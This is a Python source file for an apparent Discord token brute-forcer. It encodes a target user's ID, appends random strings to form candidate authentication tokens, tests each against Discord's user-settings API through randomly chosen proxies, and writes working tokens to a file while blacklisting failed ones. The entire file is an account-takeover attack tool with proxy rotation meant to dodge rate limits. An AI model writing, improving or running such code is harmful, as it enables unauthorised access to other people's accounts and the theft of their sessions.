import requests
from random import choice
from colorama import Fore, Style
from requests.models import Response
from base64 import standard_b64encode
from string import ascii_letters, digits

from FileSystem import FileSystem
from ProxyGenerator import ProxyGenerator


class Generator:
    url = "https://canary.discordapp.com/api/v6/users/@me/settings"
    
    def __init__(self, userid: str) -> None:
        self._userid = standard_b64encode(userid.encode("ascii")).decode("utf-8")
        self._counter = 1
        self._filesystem = FileSystem
        self._filesystem.create_file()
        self._proxy = ProxyGenerator.get()

    def generate_token(self) -> str:
        return self._userid + '.' + choice(ascii_letters).upper() + ''.join(choice(ascii_letters + digits) \
            for _ in range(5)) + "." + ''.join(choice(ascii_letters + digits + '-_') for _ in range(27))

    def random_proxy(self) -> str:
        return choice(self._proxy)

    def get_header(self, token: str) -> dict[str, str]:
        header = {
            "Content-Type": "application/json",
            "Authorization": token
        }
        return header

    def request_check(self, r: Response, token: str) -> None:
        if r.status_code == 200:
            print(Fore.GREEN + f"[{Fore.BLUE + str(self._counter) + Fore.GREEN}] Token Working." + Style.RESET_ALL)
            self._filesystem.write_token(token)
        
        elif "rate limited." in r.text:
            print(Fore.RED + f"[{Fore.BLUE + str(self._counter) + Fore.RED}] Rate Limited." + Style.RESET_ALL)
        
        else:
            print(Fore.RED + f"[{Fore.BLUE + str(self._counter) + Fore.RED}] Token Not Working!" + Style.RESET_ALL)

        print(Fore.YELLOW + token + Style.RESET_ALL)

    def get_request(self, token: str) -> None:
        header = self.get_header(token)
        proxy = self.random_proxy()
        req = requests.get(self.url, headers=header, proxies={"http": proxy})
        self.request_check(req, token)

    def start(self) -> None:
        while True:
            token = self.generate_token()
            
            if token in self._filesystem.read_blacklist():
                continue
            
            try:
                self.get_request(token)
            except Exception:
                continue
            
            self._filesystem.write_blacklist(token)
            self._counter += 1